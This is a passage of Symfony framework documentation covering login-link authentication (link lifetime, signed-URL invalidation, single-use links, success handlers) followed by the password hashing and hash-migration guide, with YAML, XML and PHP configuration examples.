    :doc:`mailer </mailer>` component to mail the login link to the user.
    Or use the  component to send an SMS to the
    user's device.

3) Send the Login Link to the User
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Now the link is created, it needs to be sent to the user. Anyone with the
link is able to login as this user, so you need to make sure to send it to
a known device of them (e.g. using e-mail or SMS).

You can send the link using any library or method. However the login link
authenticator provides integration with the :doc:`Notifier component </notifier>`.
Use the special :class:`Symfony\\Component\\Security\\Http\\LoginLink\\LoginLinkNotification`
to create a notification and send it to the user's email address or phone
number::

    // src/Controller/SecurityController.php

    // ...
    use Symfony\Component\Notifier\NotifierInterface;
    use Symfony\Component\Notifier\Recipient\Recipient;
    use Symfony\Component\Security\Http\LoginLink\LoginLinkNotification;

    class SecurityController extends AbstractController
    {
        #[Route('/login', name: 'login')]
        public function requestLoginLink(NotifierInterface $notifier, LoginLinkHandlerInterface $loginLinkHandler, UserRepository $userRepository, Request $request): Response
        {
            if ($request->isMethod('POST')) {
                $email = $request->getPayload()->get('email');
                $user = $userRepository->findOneBy(['email' => $email]);

                $loginLinkDetails = $loginLinkHandler->createLoginLink($user);

                // create a notification based on the login link details
                $notification = new LoginLinkNotification(
                    $loginLinkDetails,
                    'Welcome to MY WEBSITE!' // email subject
                );
                // create a recipient for this user
                $recipient = new Recipient($user->getEmail());

                // send the notification to the user
                $notifier->send($notification, $recipient);

                // render a "Login link is sent!" page
                return $this->render('security/login_link_sent.html.twig');
            }

            return $this->render('security/login.html.twig');
        }

        // ...
    }

.. note::

    This integration requires the :doc:`Notifier </notifier>` and
    :doc:`Mailer </mailer>` components to be installed and configured.
    Install all required packages using:

    .. code-block:: terminal

        $ composer require symfony/mailer symfony/notifier \
            symfony/twig-bundle twig/extra-bundle \
            twig/cssinliner-extra twig/inky-extra

This will send an email like this to the user:

.. image:: /_images/security/login_link_email.png
   :alt: A default Symfony e-mail containing the text "Click on the button below to confirm you want to sign in" and the button with the login link.

.. tip::

    You can customize this e-mail template by extending the
    ``LoginLinkNotification`` and configuring another ``htmlTemplate``::

        // src/Notifier/CustomLoginLinkNotification
        namespace App\Notifier;

        use Symfony\Component\Notifier\Message\EmailMessage;
        use Symfony\Component\Notifier\Recipient\EmailRecipientInterface;
        use Symfony\Component\Security\Http\LoginLink\LoginLinkNotification;

        class CustomLoginLinkNotification extends LoginLinkNotification
        {
            public function asEmailMessage(EmailRecipientInterface $recipient, ?string $transport = null): ?EmailMessage
            {
                $emailMessage = parent::asEmailMessage($recipient, $transport);

                // get the NotificationEmail object and override the template
                $email = $emailMessage->getMessage();
                $email->htmlTemplate('emails/custom_login_link_email.html.twig');

                return $emailMessage;
            }
        }

    Then, use this new ``CustomLoginLinkNotification`` in the controller
    instead.

Important Considerations
------------------------

Login links are a convenient way of authenticating users, but it is also
considered less secure than a traditional username and password form. It is
not recommended to use login links in security critical applications.

However, the implementation in Symfony does have a couple extension points
to make the login links more secure. In this section, the most important
configuration decisions are discussed:

* `Limit Login Link Lifetime`_
* `Invalidate Login Links`_
* `Allow a Link to only be Used Once`_

.. _login-link-lifetime:

Limit Login Link Lifetime
~~~~~~~~~~~~~~~~~~~~~~~~~

It is important for login links to have a limited lifetime. This reduces
the risk that someone can intercept the link and use it to login as
somebody else. By default, Symfony defines a lifetime of 10 minutes (600
seconds). You can customize this using the ``lifetime`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    login_link:
                        check_route: login_check
                        # lifetime in seconds
                        lifetime: 300

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <!-- lifetime: lifetime in seconds -->
                    <login-link check-route="login_check"
                        lifetime="300"
                    />
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->loginLink()
                    ->checkRoute('login_check')
                    // lifetime in seconds
                    ->lifetime(300)
            ;
        };

.. tip::

    You can also :ref:`customize the lifetime per link <customizing-link-lifetime>`.

.. _security-login-link-signature:

Invalidate Login Links
~~~~~~~~~~~~~~~~~~~~~~

Symfony uses signed URLs to implement login links. The advantage of this is
that valid links do not have to be stored in a database. The signed URLs
allow Symfony to still invalidate already sent login links when important
information changes (e.g. a user's email address).

The signed URL contains 3 parameters:

``expires``
    The UNIX timestamp when the link expires.

``user``
    The value returned from ``$user->getUserIdentifier()`` for this user.

``hash``
    A hash of ``expires``, ``user`` and any configured signature
    properties. Whenever these change, the hash changes and previous login
    links are invalidated.

For a user that returns ``user@example.com`` on ``$user->getUserIdentifier()``
call, the generated login link looks like this:

.. code-block:: text

    http://example.com/login_check?user=user@example.com&expires=1675707377&hash=f0Jbda56Y...A5sUCI~TQF701fwJ...7m2n4A~

You can add more properties to the ``hash`` by using the
``signature_properties`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    login_link:
                        check_route: login_check
                        signature_properties: [id, email]

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <login-link check-route="login_check">
                        <signature-property>id</signature-property>
                        <signature-property>email</signature-property>
                    </login-link>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->loginLink()
                    ->checkRoute('login_check')
                    ->signatureProperties(['id', 'email'])
            ;
        };

The properties are fetched from the user object using the
:doc:`PropertyAccess component </components/property_access>` (e.g. using
``getEmail()`` or a public ``$email`` property in this example).

.. tip::

    You can also use the signature properties to add very advanced
    invalidating logic to your login links. For instance, if you store a
    ``$lastLinkRequestedAt`` property on your users that you update in the
    ``requestLoginLink()`` controller, you can invalidate all login links
    whenever a user requests a new link.

Configure a Maximum Use of a Link
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

It is a common characteristic of login links to limit the number of times
it can be used. Symfony can support this by storing used login links in the
cache. Enable this support by setting the ``max_uses`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    login_link:
                        check_route: login_check
                        # only allow the link to be used 3 times
                        max_uses: 3

                        # optionally, configure the cache pool
                        #used_link_cache: 'cache.redis'

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <!-- max-uses: only allow the link to be used 3 times
                         used-link-cache: optionally, configure the cache pool -->
                    <login-link check-route="login_check"
                        max-uses="3"
                        used-link-cache="cache.redis"
                    />
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->loginLink()
                    ->checkRoute('login_check')

                    // only allow the link to be used 3 times
                    ->maxUses(3)

                    // optionally, configure the cache pool
                    //->usedLinkCache('cache.redis')
            ;
        };

Make sure there is enough space left in the cache, otherwise invalid links
can no longer be stored (and thus become valid again). Expired invalid
links are automatically removed from the cache.

The cache pools are not cleared by the ``cache:clear`` command, but
removing ``var/cache/`` manually may remove the cache if the cache
component is configured to store its cache in that location. Read the
:doc:`/cache` guide for more information.

Allow a Link to only be Used Once
.................................

When setting ``max_uses`` to ``1``, you must take extra precautions to
make it work as expected. Email providers and browsers often load a
preview of the links, meaning that the link is already invalidated by
the preview loader.

In order to solve this issue, first set the ``check_post_only`` option let
the authenticator only handle HTTP POST methods:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    login_link:
                        check_route: login_check
                        check_post_only: true
                        max_uses: 1

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <login-link check-route="login_check"
                        check-post-only="true"
                        max-uses="1"
                    />
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->loginLink()
                    ->checkRoute('login_check')
                    ->checkPostOnly(true)
                    ->maxUses(1)
            ;
        };

Then, use the ``check_route`` controller to render a page that lets the
user create this POST request (e.g. by clicking a button)::

    // src/Controller/SecurityController.php
    namespace App\Controller;

    // ...
    use Symfony\Component\Routing\Generator\UrlGeneratorInterface;

    class SecurityController extends AbstractController
    {
        #[Route('/login_check', name: 'login_check')]
        public function check(Request $request): Response
        {
            // get the login link query parameters
            $expires = $request->query->get('expires');
            $username = $request->query->get('user');
            $hash = $request->query->get('hash');

            // and render a template with the button
            return $this->render('security/process_login_link.html.twig', [
                'expires' => $expires,
                'user' => $username,
                'hash' => $hash,
            ]);
        }
    }

.. code-block:: html+twig

    {# templates/security/process_login_link.html.twig #}
    {% extends 'base.html.twig' %}

    {% block body %}
        <h2>Hi! You are about to login to ...</h2>

        <!-- for instance, use a form with hidden fields to
             create the POST request --->
        <form action="{{ path('login_check') }}" method="POST">
            <input type="hidden" name="expires" value="{{ expires }}">
            <input type="hidden" name="user" value="{{ user }}">
            <input type="hidden" name="hash" value="{{ hash }}">

            <button type="submit">Continue</button>
        </form>
    {% endblock %}

Hashing Strategy
~~~~~~~~~~~~~~~~

Internally, the :class:`Symfony\\Component\\Security\\Http\\LoginLink\\LoginLinkHandler`
implementation uses the
:class:`Symfony\\Component\\Security\\Core\\Signature\\SignatureHasher` to create the
hash contained in the login link.

This hasher creates a first hash with the expiration
date of the link, the values of the configured signature properties and the
user identifier. The used hashing algorithm is SHA-256.

Once this first hash is processed and encoded in Base64, a new one is created
from the first hash value and the ``kernel.secret`` container parameter. This
allows Symfony to sign this final hash, which is contained in the login URL.
The final hash is also a Base64 encoded SHA-256 hash.

.. _login-link_customize-success-handler:

Customizing the Success Handler
-------------------------------

Sometimes, the default success handling does not fit your use-case (e.g.
when you need to generate and return an API key). To customize how the
success handler behaves, create your own handler as a class that implements
:class:`Symfony\\Component\\Security\\Http\\Authentication\\AuthenticationSuccessHandlerInterface`::

    // src/Security/Authentication/AuthenticationSuccessHandler.php
    namespace App\Security\Authentication;

    use Symfony\Component\HttpFoundation\JsonResponse;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
    use Symfony\Component\Security\Http\Authentication\AuthenticationSuccessHandlerInterface;

    class AuthenticationSuccessHandler implements AuthenticationSuccessHandlerInterface
    {
        public function onAuthenticationSuccess(Request $request, TokenInterface $token): JsonResponse
        {
            $user = $token->getUser();
            $userApiToken = $user->getApiToken();

            return new JsonResponse(['apiToken' => $userApiToken]);
        }
    }

Then, configure this service ID as the ``success_handler``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    login_link:
                        check_route: login_check
                        lifetime: 600
                        max_uses: 1
                        success_handler: App\Security\Authentication\AuthenticationSuccessHandler

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <login-link check-route="login_check"
                        check-post-only="true"
                        max-uses="1"
                        lifetime="600"
                        success-handler="App\Security\Authentication\AuthenticationSuccessHandler"
                    />
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\Authentication\AuthenticationSuccessHandler;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->loginLink()
                    ->checkRoute('login_check')
                    ->lifetime(600)
                    ->maxUses(1)
                    ->successHandler(AuthenticationSuccessHandler::class)
            ;
        };

.. tip::

    If you want to customize the default failure handling, use the
    ``failure_handler`` option and create a class that implements
    :class:`Symfony\\Component\\Security\\Http\\Authentication\\AuthenticationFailureHandlerInterface`.

Customizing the Login Link
--------------------------

The ``createLoginLink()`` method accepts a second optional argument to pass the
``Request`` object used when generating the login link. This allows to customize
features such as the locale used to generate the link::

    // src/Controller/SecurityController.php
    namespace App\Controller;

    // ...
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\Security\Http\LoginLink\LoginLinkHandlerInterface;

    class SecurityController extends AbstractController
    {
        #[Route('/login', name: 'login')]
        public function requestLoginLink(LoginLinkHandlerInterface $loginLinkHandler, Request $request): Response
        {
            // check if login form is submitted
            if ($request->isMethod('POST')) {
                // ... load the user in some way

                // clone and customize Request
                $userRequest = clone $request;
                $userRequest->setLocale($user->getLocale() ?? $request->getDefaultLocale());

                // create a login link for $user (this returns an instance of LoginLinkDetails)
                $loginLinkDetails = $loginLinkHandler->createLoginLink($user, $userRequest);
                $loginLink = $loginLinkDetails->getUrl();

                // ...
            }

            return $this->render('security/request_login_link.html.twig');
        }

        // ...
    }

.. _customizing-link-lifetime:

By default, generated links use :ref:`the lifetime configured globally <login-link-lifetime>`
but you can change the lifetime per link using the third argument of the
``createLoginLink()`` method::

    // the third optional argument is the lifetime in seconds
    $loginLinkDetails = $loginLinkHandler->createLoginLink($user, null, 60);
    $loginLink = $loginLinkDetails->getUrl();
Password Hashing and Verification
=================================

Most applications use passwords to login users. These passwords should be
hashed to securely store them. Symfony's PasswordHasher component provides
all utilities to safely hash and verify passwords.

Make sure it is installed by running:

.. code-block:: terminal

   $ composer require symfony/password-hasher

Configuring a Password Hasher
-----------------------------

Before hashing passwords, you must configure a hasher using the
``password_hashers`` option. You must configure the *hashing algorithm* and
optionally some *algorithm options*:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            password_hashers:
                # auto hasher with default options for the User class (and children)
                App\Entity\User: 'auto'

                # auto hasher with custom options for all PasswordAuthenticatedUserInterface instances
                Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface:
                    algorithm: 'auto'
                    cost:      15

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <!-- auto hasher with default options for the User class (and children) -->
                <security:password-hasher
                    class="App\Entity\User"
                    algorithm="auto"
                />

                <!-- auto hasher with custom options for all PasswordAuthenticatedUserInterface instances -->
                <security:password-hasher
                    class="Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface"
                    algorithm="auto"
                    cost="15"
                />
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Entity\User;
        use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            // auto hasher with default options for the User class (and children)
            $security->passwordHasher(User::class)
                ->algorithm('auto');

            // auto hasher with custom options for all PasswordAuthenticatedUserInterface instances
            $security->passwordHasher(PasswordAuthenticatedUserInterface::class)
                ->algorithm('auto')
                ->cost(15);
        };

    .. code-block:: php-standalone

        use App\Entity\User;
        use Symfony\Component\PasswordHasher\Hasher\PasswordHasherFactory;
        use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;

        $passwordHasherFactory = new PasswordHasherFactory([
            // auto hasher with default options for the User class (and children)
            User::class => ['algorithm' => 'auto'],

            // auto hasher with custom options for all PasswordAuthenticatedUserInterface instances
            PasswordAuthenticatedUserInterface::class => [
                'algorithm' => 'auto',
                'cost' => 15,
            ],
        ]);

In this example, the "auto" algorithm is used. This hasher automatically
selects the most secure algorithm available on your system. Combined with
:ref:`password migration <security-password-migration>`, this allows you to
always secure passwords in the safest way possible (even when new
algorithms are introduced in future PHP releases).

Further in this article, you can find a
:ref:`full reference of all supported algorithms <passwordhasher-supported-algorithms>`.

.. tip::

    Hashing passwords is resource intensive and takes time in order to
    generate secure password hashes. In general, this makes your password
    hashing more secure.

    In tests however, secure hashes are not important, so you can change
    the password hasher configuration in ``test`` environment to run tests
    faster:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/test/security.yaml
            security:
                # ...

                password_hashers:
                    # Use your user class name here
                    App\Entity\User:
                        algorithm: plaintext # disable hashing (only do this in tests!)

                    # or use the lowest possible values
                    App\Entity\User:
                        algorithm: auto # This should be the same value as in config/packages/security.yaml
                        cost: 4 # Lowest possible value for bcrypt
                        time_cost: 3 # Lowest possible value for argon
                        memory_cost: 10 # Lowest possible value for argon

        .. code-block:: xml

            <!-- config/packages/test/security.xml -->
            <?xml version="1.0" encoding="UTF-8"?>
            <srv:container xmlns="http://symfony.com/schema/dic/security"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:srv="http://symfony.com/schema/dic/services"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd">

                <config>
                    <!-- class: Use your user class name here -->
                    <!-- algorithm: disable hashing (only do this in tests!) -->
                    <security:password-hasher
                        class="App\Entity\User"
                        algorithm="plaintext"
                    />

                    <!-- or use the lowest possible values -->
                    <!-- algorithm: This should be the same value as in config/packages/security.yaml -->
                    <!-- cost: Lowest possible value for bcrypt -->
                    <!-- time_cost: Lowest possible value for argon -->
                    <!-- memory_cost: Lowest possible value for argon -->
                    <security:password-hasher
                        class="App\Entity\User"
                        algorithm="auto"
                        cost="4"
                        time_cost="3"
                        memory_cost="10"
                    />
                </config>
            </srv:container>

        .. code-block:: php

            // config/packages/test/security.php
            use App\Entity\User;
            use Symfony\Config\SecurityConfig;

            return static function (SecurityConfig $security): void {
                // ...

                // Use your user class name here
                $security->passwordHasher(User::class)
                    ->algorithm('plaintext'); // disable hashing (only do this in tests!)

                // or use the lowest possible values
                $security->passwordHasher(User::class)
                    ->algorithm('auto') // This should be the same value as in config/packages/security.yaml
                    ->cost(4) // Lowest possible value for bcrypt
                    ->timeCost(2) // Lowest possible value for argon
                    ->memoryCost(10) // Lowest possible value for argon
                ;
            };

Hashing the Password
--------------------

After configuring the correct algorithm, you can use the
``UserPasswordHasherInterface`` to hash and verify the passwords:

.. configuration-block::

    .. code-block:: php-symfony

        // src/Controller/RegistrationController.php
        namespace App\Controller;

        // ...
        use Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException;
        use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;

        class UserController extends AbstractController
        {
            public function registration(UserPasswordHasherInterface $passwordHasher): Response
            {
                // ... e.g. get the user data from a registration form
                $user = new User(...);
                $plaintextPassword = ...;

                // hash the password (based on the security.yaml config for the $user class)
                $hashedPassword = $passwordHasher->hashPassword(
                    $user,
                    $plaintextPassword
                );
                $user->setPassword($hashedPassword);

                // ...
            }

            public function delete(UserPasswordHasherInterface $passwordHasher, UserInterface $user): void
            {
                // ... e.g. get the password from a "confirm deletion" dialog
                $plaintextPassword = ...;

                if (!$passwordHasher->isPasswordValid($user, $plaintextPassword)) {
                    throw new AccessDeniedHttpException();
                }
            }
        }

    .. code-block:: php-standalone

        // ...
        $passwordHasher = new UserPasswordHasher($passwordHasherFactory);

        // Get the user password (e.g. from a registration form)
        $user = new User(...);
        $plaintextPassword = ...;

        // hash the password (based on the password hasher factory config for the $user class)
        $hashedPassword = $passwordHasher->hashPassword(
            $user,
            $plaintextPassword
        );
        $user->setPassword($hashedPassword);

        // In another action (e.g. to confirm deletion), you can verify the password
        $plaintextPassword = ...;
        if (!$passwordHasher->isPasswordValid($user, $plaintextPassword)) {
            throw new \Exception('Bad credentials, cannot delete this user.');
        }

Reset Password
--------------

Using `MakerBundle`_ and `SymfonyCastsResetPasswordBundle`_, you can create
a secure out of the box solution to handle forgotten passwords. First,
install the SymfonyCastsResetPasswordBundle:

.. code-block:: terminal

    $ composer require symfonycasts/reset-password-bundle

Then, use the ``make:reset-password`` command. This asks you a few
questions about your app and generates all the files you need! After,
you'll see a success message and a list of any other steps you need to do.

.. code-block:: terminal

    $ php bin/console make:reset-password

.. tip::

    Starting in `MakerBundle`_: v1.57.0 - You can pass either ``--with-uuid`` or
    ``--with-ulid`` to ``make:reset-password``. Leveraging Symfony's :doc:`Uid Component </components/uid>`,
    the entities will be generated with the ``id`` type as :ref:`Uuid <uuid>`
    or :ref:`Ulid <ulid>` instead of ``int``.

You can customize the reset password bundle's behavior by updating the
``reset_password.yaml`` file. For more information on the configuration,
check out the `SymfonyCastsResetPasswordBundle`_  guide.

.. _security-password-migration:

Password Migration
------------------

In order to protect passwords, it is recommended to store them using the latest
hash algorithms. This means that if a better hash algorithm is supported on your
system, the user's password should be *rehashed* using the newer algorithm and
stored. That's possible with the ``migrate_from`` option:

#. `Configure a new Hasher Using "migrate_from"`_
#. `Upgrade the Password`_
#. Optionally, `Trigger Password Migration From a Custom Hasher`_

Configure a new Hasher Using "migrate_from"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When a better hashing algorithm becomes available, you should keep the existing
hasher(s), rename it, and then define the new one. Set the ``migrate_from`` option
on the new hasher to point to the old, legacy hasher(s):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            password_hashers:
                # a hasher used in the past for some users
                legacy:
                    algorithm: sha256
                    encode_as_base64: false
                    iterations: 1

                App\Entity\User:
                    # the new hasher, along with its options
                    algorithm: sodium
                    migrate_from:
                        - bcrypt # uses the "bcrypt" hasher with the default options
                        - legacy # uses the "legacy" hasher configured above

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:security="http://symfony.com/schema/dic/security"
            xsi:schemaLocation="http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <security:config>
                <!-- ... -->

                <security:password-hasher class="legacy"
                    algorithm="sha256"
                    encode-as-base64="false"
                    iterations="1"
                />

                <!-- algorithm: the new hasher, along with its options -->
                <security:password-hasher class="App\Entity\User"
                    algorithm="sodium"
                >
                    <!-- uses the bcrypt hasher with the default options -->
                    <security:migrate-from>bcrypt</security:migrate-from>

                    <!-- uses the legacy hasher configured above -->
                    <security:migrate-from>legacy</security:migrate-from>
                </security:password-hasher>
            </security:config>
        </container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->passwordHasher('legacy')
                ->algorithm('sha256')
                ->encodeAsBase64(true)
                ->iterations(1)
            ;

            $security->passwordHasher('App\Entity\User')
                // the new hasher, along with its options
                ->algorithm('sodium')
                ->migrateFrom([
                    'bcrypt', // uses the "bcrypt" hasher with the default options
                    'legacy', // uses the "legacy" hasher configured above
                ])
            ;
        };

    .. code-block:: php-standalone

        // ...
        $passwordHasherFactory = new PasswordHasherFactory([
            'legacy' => [
                'algorithm' => 'sha256',
                'encode_as_base64' => true,
                'iterations' => 1,
            ],

            User::class => [
                // the new hasher, along with its options
                'algorithm' => 'sodium',
                'migrate_from' => [
                    'bcrypt', // uses the "bcrypt" hasher with the default options
                    'legacy', // uses the "legacy" hasher configured above
                ],
            ],
        ]);

With this setup:

* New users will be hashed with the new algorithm;
* Whenever a user logs in whose password is still stored using the old algorithm,
  Symfony will verify the password with the old algorithm and then rehash
  and update the password using the new algorithm.

.. tip::

    The *auto*, *native*, *bcrypt* and *argon* hashers automatically enable
    password migration using the following list of ``migrate_from`` algorithms:

    #. :ref:`PBKDF2 <reference-security-pbkdf2>` (which uses :phpfunction:`hash_pbkdf2`);
    #. Message digest (which uses :phpfunction:`hash`)

    Both use the ``hash_algorithm`` setting as the algorithm. It is recommended to
    use ``migrate_from`` instead of ``hash_algorithm``, unless the *auto*
    hasher is used.

Upgrade the Password
~~~~~~~~~~~~~~~~~~~~

Upon successful login, the Security system checks whether a better algorithm
is available to hash the user's password. If it is, it'll hash the correct
password using the new hash. When using a custom authenticator, you must
use the ``PasswordCredentials`` in the :ref:`security passport <security-passport>`.

You can enable the upgrade behavior by implementing how this newly hashed
password should be stored:

* :ref:`When using Doctrine's entity user provider <upgrade-the-password-doctrine>`
* :ref:`When using a custom user provider <upgrade-the-password-custom-provider>`

After this, you're done and passwords are always hashed as securely as possible!

.. note::

    When using the PasswordHasher component outside a Symfony application,
    you must manually use the ``PasswordHasherInterface::needsRehash()``
    method to check if a rehash is needed and ``PasswordHasherInterface::hash()``
    method to rehash the plaintext password using the new algorithm.

.. _upgrade-the-password-doctrine:

Upgrade the Password when using Doctrine
........................................

When using the :ref:`entity user provider <security-entity-user-provider>`, implement
:class:`Symfony\\Component\\Security\\Core\\User\\PasswordUpgraderInterface` in
the ``UserRepository`` (see `the Doctrine docs for information`_ on how to
create this class if it's not already created). This interface implements
storing the newly created password hash::

    // src/Repository/UserRepository.php
    namespace App\Repository;

    // ...
    use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;
    use Symfony\Component\Security\Core\User\PasswordUpgraderInterface;

    class UserRepository extends EntityRepository implements PasswordUpgraderInterface
    {
        // ...

        public function upgradePassword(PasswordAuthenticatedUserInterface $user, string $newHashedPassword): void
        {
            // set the new hashed password on the User object
            $user->setPassword($newHashedPassword);

            // execute the queries on the database
            $this->getEntityManager()->flush();
        }
    }

.. _upgrade-the-password-custom-provider:

Upgrade the Password when using a Custom User Provider
......................................................

If you're using a :ref:`custom user provider <security-custom-user-provider>`, implement the
:class:`Symfony\\Component\\Security\\Core\\User\\PasswordUpgraderInterface` in
the user provider::

    // src/Security/UserProvider.php
    namespace App\Security;

    // ...
    use Symfony\Component\Security\Core\User\PasswordUpgraderInterface;

    class UserProvider implements UserProviderInterface, PasswordUpgraderInterface
    {
        // ...

        public function upgradePassword(UserInterface $user, string $newHashedPassword): void
        {
            // set the new hashed password on the User object
            $user->setPassword($newHashedPassword);

            // ... store the new password
        }
    }

Trigger Password Migration From a Custom Hasher
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you're using a custom password hasher, you can trigger the password
migration by returning ``true`` in the ``needsRehash()`` method::

    // src/Security/CustomPasswordHasher.php
    namespace App\Security;

    // ...
    use Symfony\Component\PasswordHasher\PasswordHasherInterface;

    class CustomPasswordHasher implements PasswordHasherInterface
    {
        // ...

        public function needsRehash(string $hashedPassword): bool
        {
            // check whether the current password is hashed using an outdated hasher
            $hashIsOutdated = ...;

            return $hashIsOutdated;
        }
    }

.. _named-password-hashers:

Dynamic Password Hashers
------------------------

Usually, the same password hasher is used for all users by configuring it
to apply to all instances of a specific class. Another option is to use a
"named" hasher and then select which hasher you want to use dynamically.

By default (as shown at the start of the article), the ``auto`` algorithm
is used for ``App\Entity\User``.

This may be secure enough for a regular user, but what if you want your
admins to have a stronger algorithm, for example ``auto`` with a higher
cost. This can be done with named hashers:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            password_hashers:
                harsh:
                    algorithm: auto
                    cost: 15

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd"
        >

            <config>
                <!-- ... -->
                <security:password-hasher class="harsh"
                    algorithm="auto"
